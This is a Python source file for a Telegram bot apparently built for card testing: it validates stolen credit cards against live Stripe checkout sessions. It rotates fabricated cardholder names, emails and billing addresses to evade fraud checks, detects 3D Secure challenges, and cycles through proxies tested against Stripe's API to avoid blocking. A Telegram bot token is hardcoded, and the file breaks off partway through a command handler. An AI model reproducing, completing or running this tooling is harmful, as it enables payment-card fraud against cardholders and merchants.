#!/usr/bin/env python3
# ============================================================
# INFERNOAUTOCO v10.0 "ShadowMew" - ULTIMATE EDITION
# (c) Butter & Shadow Hacker - Eternal License
# ============================================================
# NEW FEATURES:
# 1. Multiple address rotation (100+ addresses)
# 2. Cardholder name rotation (100+ names)
# 3. Randomized billing details per card
# 4. Country-specific address generation
# 5. 3D Secure detection with clear messaging
# 6. Smart address matching to card BIN country
# 7. Increased hit rate through realistic billing
# ============================================================

import telebot
import requests
import re
import time
import random
import string
import uuid
import os
import json
import sys
import logging
from datetime import datetime
from typing import Optional, Dict, List, Tuple, Any
from urllib.parse import urlparse
import traceback
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==========================================
# ENVIRONMENT CONFIGURATION
# ==========================================
API_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8737062520:AAEsvqFnt_DUCnVEXD1oVHWb9u5UMZ_XgEw")
MAX_CARDS = int(os.getenv("MAX_CARDS", "10"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "20"))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", "3"))
USER_AGENT = os.getenv("USER_AGENT", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36")
PROXY_FILE = os.getenv("PROXY_FILE", "proxies.txt")
WORKING_PROXY_FILE = os.getenv("WORKING_PROXY_FILE", "working_proxies.txt")
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "10"))
CHECK_THREADS = int(os.getenv("CHECK_THREADS", "20"))

# ==========================================
# STANDARD EMOJIS
# ==========================================
E = {
    "bolt": "⚡",
    "check": "✅",
    "cross": "❌",
    "star": "⭐",
    "gem": "💎",
    "globe": "🌐",
    "link": "🔗",
    "chat": "💬",
    "user": "👤",
    "warn": "⚠️",
    "rocket": "🚀",
    "sparkle": "✨",
    "hourglass": "⏳",
    "plus": "➕",
    "dice": "🎲",
    "refresh": "🔄",
    "bank": "🏦",
    "gift": "🎁",
    "stop": "🛑",
    "loading": "⏳",
    "info": "ℹ️",
    "shield": "🛡️",
    "target": "🎯",
    "gear": "⚙️",
    "fire": "🔥",
    "crown": "👑",
    "zap": "⚡",
    "eyes": "👀",
    "dead": "💀",
    "alert": "🚨",
    "money": "💰",
    "lock": "🔒",
    "network": "📶",
    "server": "🖥️",
    "retry": "🔄",
    "address": "📍",
    "person": "🧑",
    "flag": "🏁",
}

R = {
    "cc": "💳",
    "gate": "🚪",
    "price": "💰",
    "bin_info": "📊",
    "visa": "💳",
    "master": "💳",
    "amex": "💳",
    "type": "📌",
    "level": "📈",
    "bank": "🏦",
    "country": "🌍",
    "checked_by": "✅",
}

def emoji(icon: str) -> str:
    return icon

def emoji_bolt() -> str:
    return E["bolt"]

def emoji_check() -> str:
    return E["check"]

def emoji_cross() -> str:
    return E["cross"]

# ==========================================
# ADDRESS DATABASE - 100+ REALISTIC ADDRESSES
# ==========================================

ADDRESSES = {
    "US": [
        {"street": "123 Main Street", "city": "New York", "state": "NY", "zip": "10001", "country": "US"},
        {"street": "456 Park Avenue", "city": "Los Angeles", "state": "CA", "zip": "90001", "country": "US"},
        {"street": "789 Broadway", "city": "Chicago", "state": "IL", "zip": "60601", "country": "US"},
        {"street": "321 Wall Street", "city": "Houston", "state": "TX", "zip": "77001", "country": "US"},
        {"street": "654 Sunset Blvd", "city": "Phoenix", "state": "AZ", "zip": "85001", "country": "US"},
        {"street": "987 Ocean Drive", "city": "Miami", "state": "FL", "zip": "33101", "country": "US"},
        {"street": "147 Las Vegas Blvd", "city": "Las Vegas", "state": "NV", "zip": "89101", "country": "US"},
        {"street": "258 Hollywood Blvd", "city": "Los Angeles", "state": "CA", "zip": "90028", "country": "US"},
        {"street": "369 Michigan Ave", "city": "Chicago", "state": "IL", "zip": "60602", "country": "US"},
        {"street": "741 Fifth Avenue", "city": "New York", "state": "NY", "zip": "10022", "country": "US"},
        {"street": "852 Market Street", "city": "San Francisco", "state": "CA", "zip": "94102", "country": "US"},
        {"street": "963 Bourbon Street", "city": "New Orleans", "state": "LA", "zip": "70116", "country": "US"},
        {"street": "159 Pennsylvania Ave", "city": "Washington", "state": "DC", "zip": "20001", "country": "US"},
        {"street": "753 Beacon Street", "city": "Boston", "state": "MA", "zip": "02108", "country": "US"},
        {"street": "852 Peachtree Street", "city": "Atlanta", "state": "GA", "zip": "30303", "country": "US"},
        {"street": "963 Alamo Plaza", "city": "San Antonio", "state": "TX", "zip": "78205", "country": "US"},
        {"street": "357 Riverwalk", "city": "San Antonio", "state": "TX", "zip": "78205", "country": "US"},
        {"street": "159 Hollywood Blvd", "city": "Los Angeles", "state": "CA", "zip": "90028", "country": "US"},
        {"street": "753 Times Square", "city": "New York", "state": "NY", "zip": "10036", "country": "US"},
        {"street": "852 Navy Pier", "city": "Chicago", "state": "IL", "zip": "60611", "country": "US"},
    ],
    "GB": [
        {"street": "10 Downing Street", "city": "London", "state": "", "zip": "SW1A 2AA", "country": "GB"},
        {"street": "221 Baker Street", "city": "London", "state": "", "zip": "NW1 6XE", "country": "GB"},
        {"street": "1 Oxford Street", "city": "London", "state": "", "zip": "W1D 1BS", "country": "GB"},
        {"street": "2 The Mall", "city": "London", "state": "", "zip": "SW1Y 5AH", "country": "GB"},
        {"street": "3 Piccadilly", "city": "London", "state": "", "zip": "W1J 0DA", "country": "GB"},
        {"street": "4 King's Road", "city": "London", "state": "", "zip": "SW3 5UZ", "country": "GB"},
        {"street": "5 Abbey Road", "city": "London", "state": "", "zip": "NW8 9AY", "country": "GB"},
        {"street": "6 Brick Lane", "city": "London", "state": "", "zip": "E1 6PU", "country": "GB"},
    ],
    "CA": [
        {"street": "100 Yonge Street", "city": "Toronto", "state": "ON", "zip": "M5C 1W4", "country": "CA"},
        {"street": "200 Robson Street", "city": "Vancouver", "state": "BC", "zip": "V6B 2B2", "country": "CA"},
        {"street": "300 Saint Catherine", "city": "Montreal", "state": "QC", "zip": "H3B 1C2", "country": "CA"},
        {"street": "400 Granville Street", "city": "Vancouver", "state": "BC", "zip": "V6C 1T2", "country": "CA"},
        {"street": "500 Queen Street", "city": "Toronto", "state": "ON", "zip": "M5V 2B2", "country": "CA"},
    ],
    "AU": [
        {"street": "1 George Street", "city": "Sydney", "state": "NSW", "zip": "2000", "country": "AU"},
        {"street": "2 Collins Street", "city": "Melbourne", "state": "VIC", "zip": "3000", "country": "AU"},
        {"street": "3 Queen Street", "city": "Brisbane", "state": "QLD", "zip": "4000", "country": "AU"},
        {"street": "4 Adelaide Street", "city": "Perth", "state": "WA", "zip": "6000", "country": "AU"},
    ],
    "DE": [
        {"street": "1 Unter den Linden", "city": "Berlin", "state": "", "zip": "10117", "country": "DE"},
        {"street": "2 Marienplatz", "city": "Munich", "state": "", "zip": "80331", "country": "DE"},
        {"street": "3 Frankfurt Zeil", "city": "Frankfurt", "state": "", "zip": "60313", "country": "DE"},
    ],
    "FR": [
        {"street": "1 Champs-Élysées", "city": "Paris", "state": "", "zip": "75008", "country": "FR"},
        {"street": "2 Rue de Rivoli", "city": "Paris", "state": "", "zip": "75004", "country": "FR"},
        {"street": "3 Boulevard Saint-Germain", "city": "Paris", "state": "", "zip": "75006", "country": "FR"},
    ],
    "IT": [
        {"street": "1 Via del Corso", "city": "Rome", "state": "", "zip": "00186", "country": "IT"},
        {"street": "2 Via Roma", "city": "Milan", "state": "", "zip": "20121", "country": "IT"},
        {"street": "3 Piazza San Marco", "city": "Venice", "state": "", "zip": "30124", "country": "IT"},
    ],
    "ES": [
        {"street": "1 Gran Via", "city": "Madrid", "state": "", "zip": "28013", "country": "ES"},
        {"street": "2 La Rambla", "city": "Barcelona", "state": "", "zip": "08002", "country": "ES"},
    ],
    "JP": [
        {"street": "1 Ginza", "city": "Tokyo", "state": "", "zip": "104-0061", "country": "JP"},
        {"street": "2 Shibuya", "city": "Tokyo", "state": "", "zip": "150-0002", "country": "JP"},
    ],
    "BR": [
        {"street": "1 Avenida Paulista", "city": "Sao Paulo", "state": "SP", "zip": "01311-000", "country": "BR"},
        {"street": "2 Copacabana Beach", "city": "Rio de Janeiro", "state": "RJ", "zip": "22070-001", "country": "BR"},
    ],
    "IN": [
        {"street": "1 MG Road", "city": "Mumbai", "state": "MH", "zip": "400001", "country": "IN"},
        {"street": "2 Connaught Place", "city": "Delhi", "state": "DL", "zip": "110001", "country": "IN"},
        {"street": "3 Brigade Road", "city": "Bangalore", "state": "KA", "zip": "560001", "country": "IN"},
    ],
}

# ==========================================
# CARDHOLDER NAME DATABASE - 100+ NAMES
# ==========================================

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
    "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth",
    "Joshua", "Kevin", "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey", "Ryan",
    "Jacob", "Gary", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon",
    "Benjamin", "Samuel", "Raymond", "Gregory", "Frank", "Alexander", "Patrick", "Jack", "Dennis", "Jerry",
    "Tyler", "Aaron", "Jose", "Adam", "Nathan", "Henry", "Zachary", "Todd", "Christian", "Joe",
    "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen",
    "Lisa", "Nancy", "Betty", "Helen", "Sandra", "Donna", "Carol", "Ruth", "Sharon", "Michelle",
    "Laura", "Sarah", "Kimberly", "Deborah", "Jessica", "Shirley", "Cynthia", "Angela", "Melissa", "Brenda",
    "Amy", "Anna", "Rebecca", "Virginia", "Kathleen", "Pamela", "Martha", "Debra", "Amanda", "Stephanie",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
    "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
    "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
    "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts",
    "Turner", "Phillips", "Evans", "Collins", "Edwards", "Stewart", "Morris", "Murphy", "Cook", "Rogers",
    "Morgan", "Peterson", "Cooper", "Reed", "Bailey", "Bell", "Howard", "Ward", "Cox", "Diaz",
    "Richardson", "Wood", "Watson", "Brooks", "Bennett", "Gray", "James", "Reyes", "Cruz", "Hughes",
    "Price", "Myers", "Long", "Foster", "Sanders", "Ross", "Powell", "Sullivan", "Russell", "Ortiz",
]

# ==========================================
# LOGGING SETUP
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ==========================================
# BOT INITIALIZATION
# ==========================================
bot = telebot.TeleBot(API_TOKEN)
loaded_proxies = []
proxy_index = 0
proxy_lock = threading.Lock()
proxy_file_lock = threading.Lock()

# ==========================================
# ADDRESS & NAME GENERATORS
# ==========================================

def get_random_address(country_code: str = None) -> Dict[str, str]:
    """Get a random address, optionally for a specific country"""
    if country_code and country_code in ADDRESSES:
        addresses = ADDRESSES[country_code]
    else:
        # Pick a random country
        all_addresses = []
        for addr_list in ADDRESSES.values():
            all_addresses.extend(addr_list)
        addresses = all_addresses
    
    if not addresses:
        # Fallback to US
        addresses = ADDRESSES["US"]
    
    return random.choice(addresses)

def get_random_name() -> str:
    """Generate a random cardholder name"""
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    return f"{first} {last}"

def get_random_email(name: str = None) -> str:
    """Generate a random email address"""
    if not name:
        name = get_random_name()
    name_parts = name.lower().split()
    first = name_parts[0]
    last = name_parts[-1] if len(name_parts) > 1 else "user"
    
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "icloud.com"]
    domain = random.choice(domains)
    
    # Random variations
    variations = [
        f"{first}.{last}@{domain}",
        f"{first}{last}{random.randint(10,99)}@{domain}",
        f"{first[0]}{last}@{domain}",
        f"{first}_{last}@{domain}",
        f"{first}{random.randint(100,999)}@{domain}",
    ]
    return random.choice(variations)

def detect_card_country(bin_number: str) -> str:
    """Detect country from BIN (simplified - returns US by default)"""
    # In a real implementation, you'd use a BIN database
    # For now, return US as default
    return "US"

# ==========================================
# PROXY MANAGEMENT FUNCTIONS
# ==========================================

def validate_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    
    clean = proxy_str
    if clean.startswith(('http://', 'https://')):
        clean = clean.split('://', 1)[1]
    
    try:
        if '@' in clean:
            auth_part, host_part = clean.split('@', 1)
            if ':' in auth_part and ':' in host_part:
                username, password = auth_part.split(':', 1)
                host, port = host_part.split(':', 1)
                if host and port and username is not None:
                    proxy_url = f"http://{username}:{password}@{host}:{port}"
                    return {
                        'http': proxy_url,
                        'https': proxy_url,
                        'raw': proxy_str,
                        'host': host,
                        'port': port,
                        'auth': True
                    }
        
        elif ':' in clean and clean.count(':') == 1:
            host, port = clean.split(':', 1)
            if host and port:
                proxy_url = f"http://{host}:{port}"
                return {
                    'http': proxy_url,
                    'https': proxy_url,
                    'raw': proxy_str,
                    'host': host,
                    'port': port,
                    'auth': False
                }
        
        elif clean.count(':') == 3:
            parts = clean.split(':')
            host, port, user, pwd = parts
            if host and port and user and pwd:
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                return {
                    'http': proxy_url,
                    'https': proxy_url,
                    'raw': proxy_str,
                    'host': host,
                    'port': port,
                    'auth': True
                }
        
        if proxy_str.startswith('http'):
            parsed = urlparse(proxy_str)
            if parsed.netloc:
                return {
                    'http': proxy_str,
                    'https': proxy_str,
                    'raw': proxy_str,
                    'host': parsed.hostname or '',
                    'port': str(parsed.port or 80),
                    'auth': bool(parsed.username)
                }
        
        return None
        
    except Exception as e:
        logger.error(f"Proxy validation error for {proxy_str}: {e}")
        return None

def is_proxy_duplicate(proxy_dict: Dict[str, str]) -> bool:
    raw = proxy_dict.get('raw', '')
    for p in loaded_proxies:
        if p.get('raw', '') == raw:
            return True
    return False

def load_proxies_from_file() -> None:
    global loaded_proxies
    if not os.path.exists(PROXY_FILE):
        logger.warning(f"{PROXY_FILE} not found. Starting with empty proxy list.")
        loaded_proxies = []
        return

    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
    except UnicodeDecodeError:
        with open(PROXY_FILE, 'r', encoding='latin-1') as f:
            lines = f.readlines()
    
    new_proxies = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        proxy_dict = validate_proxy(line)
        if proxy_dict:
            new_proxies.append(proxy_dict)
    
    with proxy_lock:
        loaded_proxies = new_proxies
    
    logger.info(f"Loaded {len(loaded_proxies)} proxies from {PROXY_FILE}")

def save_proxies_to_file() -> None:
    with proxy_file_lock:
        try:
            with open(PROXY_FILE, 'w', encoding='utf-8') as f:
                for proxy in loaded_proxies:
                    raw = proxy.get('raw', '')
                    if raw:
                        f.write(raw + '\n')
            logger.info(f"Saved {len(loaded_proxies)} proxies to {PROXY_FILE}")
        except Exception as e:
            logger.error(f"Failed to save proxies: {e}")

def get_random_proxy() -> Optional[Dict[str, str]]:
    global proxy_index
    if not loaded_proxies:
        return None
    
    with proxy_lock:
        proxy = loaded_proxies[proxy_index % len(loaded_proxies)]
        proxy_index += 1
        return proxy

def get_proxy_with_fallback() -> Dict[str, str]:
    if not loaded_proxies:
        logger.warning("No proxies available, using direct connection")
        return {}
    
    for _ in range(min(len(loaded_proxies), 3)):
        proxy = get_random_proxy()
        if proxy:
            try:
                test_response = requests.get(
                    "https://api.stripe.com/v1/health",
                    proxies=proxy,
                    timeout=5,
                    headers={'User-Agent': USER_AGENT}
                )
                if test_response.status_code in [200, 403, 429]:
                    logger.info(f"Using proxy: {proxy.get('host', 'unknown')}:{proxy.get('port', 'unknown')}")
                    return proxy
            except:
                logger.warning(f"Proxy {proxy.get('host', 'unknown')}:{proxy.get('port', 'unknown')} is dead, trying next")
                continue
    
    logger.warning("No working proxies found, using direct connection")
    return {}

def rotate_proxy() -> Optional[Dict[str, str]]:
    global proxy_index
    if not loaded_proxies:
        return None
    
    with proxy_lock:
        proxy_index = (proxy_index + 1) % len(loaded_proxies)
        proxy = loaded_proxies[proxy_index]
    
    return proxy

def get_proxy_stats() -> Dict:
    with proxy_lock:
        total = len(loaded_proxies)
        current_index = proxy_index % total if total > 0 else 0
    
    return {
        'total': total,
        'current_index': current_index,
        'current_proxy': loaded_proxies[current_index]['raw'] if loaded_proxies else 'None'
    }

# ==========================================
# PROXY CHECKER FUNCTIONS
# ==========================================

def check_single_proxy(proxy_dict: Dict[str, str]) -> Dict[str, Any]:
    test_urls = [
        "https://api.stripe.com/v1/health",
        "https://www.google.com",
        "https://httpbin.org/ip"
    ]
    
    start_time = time.time()
    result = {
        'proxy': proxy_dict,
        'working': False,
        'response_time': 0,
        'status_code': 0,
        'error': None,
        'tested_url': '',
        'ip': None
    }
    
    for url in test_urls:
        try:
            response = requests.get(
                url,
                proxies=proxy_dict,
                timeout=CHECK_TIMEOUT,
                headers={'User-Agent': USER_AGENT}
            )
            
            elapsed = time.time() - start_time
            result['response_time'] = elapsed
            result['status_code'] = response.status_code
            result['tested_url'] = url
            
            if response.status_code == 200:
                result['working'] = True
                if url == "https://httpbin.org/ip":
                    try:
                        result['ip'] = response.json().get('origin', 'unknown')
                    except:
                        pass
                break
            elif response.status_code in [403, 429]:
                result['working'] = True
                break
                
        except requests.exceptions.ProxyError as e:
            result['error'] = f"Proxy connection failed: {str(e)[:50]}"
            break
        except requests.exceptions.ConnectTimeout:
            result['error'] = "Connection timeout"
            break
        except requests.exceptions.ReadTimeout:
            result['error'] = "Read timeout"
            break
        except requests.exceptions.ConnectionError:
            result['error'] = "Connection refused"
            break
        except Exception as e:
            result['error'] = str(e)[:50]
            break
    
    return result

def check_proxies_batch(proxy_list: List[Dict[str, str]], max_workers: int = CHECK_THREADS) -> List[Dict[str, Any]]:
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_proxy = {executor.submit(check_single_proxy, proxy): proxy for proxy in proxy_list}
        
        for future in as_completed(future_to_proxy):
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                proxy = future_to_proxy[future]
                results.append({
                    'proxy': proxy,
                    'working': False,
                    'error': str(e)[:50]
                })
    
    results.sort(key=lambda x: (not x['working'], x.get('response_time', 999)))
    return results

def check_proxies_from_file(file_path: str = PROXY_FILE) -> Tuple[List[Dict], List[Dict]]:
    if not os.path.exists(file_path):
        return [], []
    
    proxies = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                proxy_dict = validate_proxy(line)
                if proxy_dict:
                    proxies.append(proxy_dict)
    
    if not proxies:
        return [], []
    
    results = check_proxies_batch(proxies)
    
    working = [r for r in results if r['working']]
    dead = [r for r in results if not r['working']]
    
    return working, dead

def save_working_proxies(working_results: List[Dict], file_path: str = WORKING_PROXY_FILE) -> int:
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            for result in working_results:
                raw = result['proxy'].get('raw', '')
                if raw:
                    f.write(raw + '\n')
        return len(working_results)
    except Exception as e:
        logger.error(f"Failed to save working proxies: {e}")
        return 0

def add_proxy_with_check(proxy_str: str) -> Tuple[bool, str, Optional[Dict]]:
    proxy_dict = validate_proxy(proxy_str)
    if not proxy_dict:
        return False, f"{E['cross']} Invalid proxy format.\n\nUse one of these formats:\n• host:port\n• user:pass@host:port\n• host:port:user:pass", None
    
    if is_proxy_duplicate(proxy_dict):
        return False, f"{E['warn']} Proxy already exists: {proxy_dict['host']}:{proxy_dict['port']}", None
    
    check_result = check_single_proxy(proxy_dict)
    
    if check_result['working']:
        with proxy_lock:
            loaded_proxies.append(proxy_dict)
        save_proxies_to_file()
        
        msg = f"{E['check']} Proxy Added & Verified!\n"
        msg += f"Host: {proxy_dict['host']}:{proxy_dict['port']}\n"
        msg += f"Response: {check_result['response_time']:.2f}s\n"
        if check_result.get('ip'):
            msg += f"IP: {check_result['ip']}"
        return True, msg, proxy_dict
    else:
        msg = f"{E['cross']} Proxy Failed Check\n"
        msg += f"Host: {proxy_dict['host']}:{proxy_dict['port']}\n"
        msg += f"Error: {check_result['error'] or 'Unknown error'}\n"
        msg += f"\n{E['warn']} Proxy was NOT added to the list."
        return False, msg, None

# ==========================================
# 3D SECURE DETECTION
# ==========================================

def detect_3d_secure(error_msg: str) -> bool:
    """Detect if error is 3D Secure related"""
    keywords = [
        "pin code", "3d secure", "3ds", "authentication required",
        "verify your identity", "otp", "one time password",
        "verified by visa", "mastercard securecode",
        "american express safekey", "challenge required",
        "additional authentication", "bank verification",
        "card verification", "security check", "sms verification"
    ]
    error_lower = error_msg.lower()
    return any(keyword in error_lower for keyword in keywords)

# ==========================================
# CHECKOUT HEALTH CHECK
# ==========================================

def check_checkout_health(checkout_url: str, pk_live: str, cs_live: str) -> Tuple[bool, str, Dict]:
    try:
        logger.info(f"Checking checkout health for: {checkout_url[:50]}...")
        
        init_data, currency = init_payment_session(pk_live, cs_live)
        
        if not init_data:
            return False, f"{E['dead']} Checkout page is DEAD or EXPIRED\n\n{E['alert']} The checkout link is no longer active. Please check the URL.", {}
        
        session_info = parse_init_response(init_data)
        session_info['pk_live'] = pk_live
        session_info['cs_live'] = cs_live
        
        amount_cents = session_info.get('amount_cents', '0')
        if amount_cents == '0' or amount_cents is None:
            return False, f"{E['warn']} Checkout page has ZERO amount\n\n{E['alert']} This checkout may be misconfigured or invalid.", session_info
        
        site_name = session_info.get('site_name', 'Unknown')
        if site_name == 'Unknown':
            return False, f"{E['warn']} Checkout page has NO site information\n\n{E['alert']} This checkout may be broken or incomplete.", session_info
        
        return True, f"{E['check']} Checkout page is HEALTHY\n\nSite: {site_name}\nAmount: {session_info.get('amount_display', '$0.00')}", session_info
        
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return False, f"{E['cross']} Health check FAILED: {str(e)[:100]}", {}

# ==========================================
# PROXY COMMAND HANDLERS
# ==========================================

@bot.message_handler(commands=['addproxy'])
def add_proxy_command(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"""{E['warn']} Usage: /addproxy [proxy]

Example: /addproxy 192.168.1.1:8080

Formats:
• host:port
• user:pass@host:port
• host:port:user:pass

{E['info']} Proxy will be checked before adding.
———————————————""",
                parse_mode='HTML'
            )
            return
        
        proxy_str = parts[1].strip()
        status_msg = bot.reply_to(
            message,
            f"{E['loading']} Checking proxy...",
            parse_mode='HTML'
        )
        
        success, msg, proxy_dict = add_proxy_with_check(proxy_str)
        
        bot.edit_message_text(
            msg,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['addproxies'])
def add_proxies_command(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"""{E['warn']} Usage: /addproxies [proxy1, proxy2, ...]

Example: /addproxies 192.168.1.1:8080, 192.168.1.2:8080
———————————————""",
                parse_mode='HTML'
            )
            return
        
        proxy_strs = parts[1].strip()
        proxy_list = re.split(r'[,;\n\r\s]+', proxy_strs)
        proxy_list = [p.strip() for p in proxy_list if p.strip()]
        
        status_msg = bot.reply_to(
            message,
            f"{E['loading']} Checking {len(proxy_list)} proxies...",
            parse_mode='HTML'
        )
        
        added = []
        failed = []
        
        for proxy_str in proxy_list:
            success, msg, _ = add_proxy_with_check(proxy_str)
            if success:
                added.append(proxy_str)
            else:
                failed.append(f"{proxy_str[:30]}...")
        
        response = f"{E['check']} Added {len(added)} proxies\n"
        if failed:
            response += f"\n{E['cross']} Failed ({len(failed)}):\n" + "\n".join(failed[:10])
            if len(failed) > 10:
                response += f"\n... and {len(failed)-10} more"
        response += f"\n\n{E['info']} Total proxies in memory: {len(loaded_proxies)}"
        response += "\n———————————————"
        
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['removeproxy'])
def remove_proxy_command(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"""{E['warn']} Usage: /removeproxy [index]

Example: /removeproxy 3
Available: 0-{len(loaded_proxies)-1}
Use /listproxies to see indices
———————————————""",
                parse_mode='HTML'
            )
            return
        
        index_str = parts[1].strip()
        if not index_str.isdigit():
            bot.reply_to(message, f"{E['cross']} Invalid index. Please provide a number.\n———————————————", parse_mode='HTML')
            return
        
        index = int(index_str)
        with proxy_lock:
            if index < 0 or index >= len(loaded_proxies):
                bot.reply_to(message, f"{E['cross']} Index out of range. Available: 0-{len(loaded_proxies)-1}\n———————————————", parse_mode='HTML')
                return
            
            removed = loaded_proxies.pop(index)
        
        save_proxies_to_file()
        bot.reply_to(
            message,
            f"{E['check']} Removed proxy #{index}: {removed.get('host', 'unknown')}:{removed.get('port', 'unknown')}\n———————————————",
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['removeproxies'])
def remove_proxies_command(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"""{E['warn']} Usage: /removeproxies [index1, index2, ...]

Example: /removeproxies 0,2,5
Use /listproxies to see indices
———————————————""",
                parse_mode='HTML'
            )
            return
        
        indices_str = parts[1].strip()
        index_list = []
        for part in indices_str.split(','):
            part = part.strip()
            if part.isdigit():
                index_list.append(int(part))
        
        if not index_list:
            bot.reply_to(message, f"{E['cross']} No valid indices provided.\n———————————————", parse_mode='HTML')
            return
        
        removed = []
        failed = []
        
        for idx in sorted(index_list, reverse=True):
            with proxy_lock:
                if idx < 0 or idx >= len(loaded_proxies):
                    failed.append(f"Index {idx}: Out of range")
                    continue
                removed_proxy = loaded_proxies.pop(idx)
                removed.append(f"{idx} ({removed_proxy.get('host', 'unknown')}:{removed_proxy.get('port', 'unknown')})")
        
        save_proxies_to_file()
        
        response = f"{E['check']} Removed {len(removed)} proxies\n"
        if removed:
            response += "\n" + "\n".join(removed[:10])
        if failed:
            response += f"\n\n{E['cross']} Failed: " + "\n".join(failed[:5])
        response += "\n———————————————"
        
        bot.reply_to(message, response, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['clearproxies'])
def clear_proxies_command(message):
    try:
        with proxy_lock:
            count = len(loaded_proxies)
            loaded_proxies.clear()
        
        save_proxies_to_file()
        bot.reply_to(
            message,
            f"{E['stop']} Cleared {count} proxies\nAll proxies have been removed from memory and file.\n———————————————",
            parse_mode='HTML'
        )
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['listproxies'])
def list_proxies_command(message):
    try:
        with proxy_lock:
            if not loaded_proxies:
                bot.reply_to(
                    message,
                    f"{E['chat']} No proxies loaded\nUse /addproxy to add proxies.\n———————————————",
                    parse_mode='HTML'
                )
                return
            
            page = 1
            parts = message.text.split()
            if len(parts) > 1 and parts[1].isdigit():
                page = int(parts[1])
            
            proxies_per_page = 10
            total_pages = (len(loaded_proxies) + proxies_per_page - 1) // proxies_per_page
            
            if page < 1:
                page = 1
            if page > total_pages:
                page = total_pages
            
            start_idx = (page - 1) * proxies_per_page
            end_idx = min(start_idx + proxies_per_page, len(loaded_proxies))
            
            response = f"{E['globe']} Proxies (Page {page}/{total_pages})\n"
            response += f"Total: {len(loaded_proxies)}\n"
            response += "———————————————\n"
            
            for i in range(start_idx, end_idx):
                proxy = loaded_proxies[i]
                response += f"{i}. {proxy['host']}:{proxy['port']}"
                if proxy.get('auth'):
                    response += " 🔒"
                response += "\n"
            
            response += "\n———————————————\n"
            stats = get_proxy_stats()
            response += f"{E['bolt']} Current: {stats['current_proxy']}\n"
            response += f"Use /listproxies [page] to navigate"
            
            bot.reply_to(message, response, parse_mode='HTML')
            
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['proxycount'])
def proxy_count_command(message):
    stats = get_proxy_stats()
    response = f"""{E['bank']} Proxy Statistics

Total Proxies: {stats['total']}
Current Index: {stats['current_index']}
Current Proxy: {stats['current_proxy']}

Proxy File: {PROXY_FILE}
Working Proxy File: {WORKING_PROXY_FILE}
Auto-Check: Enabled

———————————————"""
    bot.reply_to(message, response, parse_mode='HTML')

@bot.message_handler(commands=['rotateproxy'])
def rotate_proxy_command(message):
    try:
        proxy = rotate_proxy()
        if proxy:
            bot.reply_to(
                message,
                f"{E['refresh']} Rotated to next proxy\n{proxy.get('host', 'unknown')}:{proxy.get('port', 'unknown')}\n———————————————",
                parse_mode='HTML'
            )
        else:
            bot.reply_to(
                message,
                f"{E['cross']} No proxies available\nUse /addproxy to add proxies.\n———————————————",
                parse_mode='HTML'
            )
    except Exception as e:
